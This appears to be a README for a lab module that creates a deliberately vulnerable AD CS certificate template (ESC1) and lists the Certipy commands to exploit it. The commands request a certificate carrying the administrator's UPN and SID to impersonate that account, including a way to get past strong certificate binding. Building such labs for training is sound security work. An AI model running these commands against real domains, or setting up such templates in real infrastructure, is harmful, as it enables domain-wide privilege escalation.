# esc1

Creates and publishes certificate template `ESC1` on the CA host. Enrollee supplies the subject (SAN), client authentication EKU, enrollable by `Domain Users`. Template JSON: `ansible/roles/adcs_templates/files/ESC1.json` (referenced, not copied).

Attack:

    certipy find -u administrator@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout
    certipy req -u <user>@<domain> -p '<pass>' -ca <ca name> -template ESC1 -upn administrator@<domain> -sid <administrator SID>
    certipy auth -pfx administrator.pfx -dc-ip <dc ip>

The `-Base` labs enforce strong certificate binding on the DCs (`dc.strong_cert_binding: 2`). In that mode the KDC refuses a certificate that has no SID extension matching the account it maps to, so a request with only `-upn` fails at `certipy auth` (`KDC_ERR_CERTIFICATE_MISMATCH`). `-sid` puts the target's SID in the certificate. Get the SID with, for example:

    certipy account read -u <user>@<domain> -p '<pass>' -dc-ip <dc ip> -user administrator

Disable revokes every certificate issued from `ESC1`, unpublishes the template and deletes it (with its OID object).
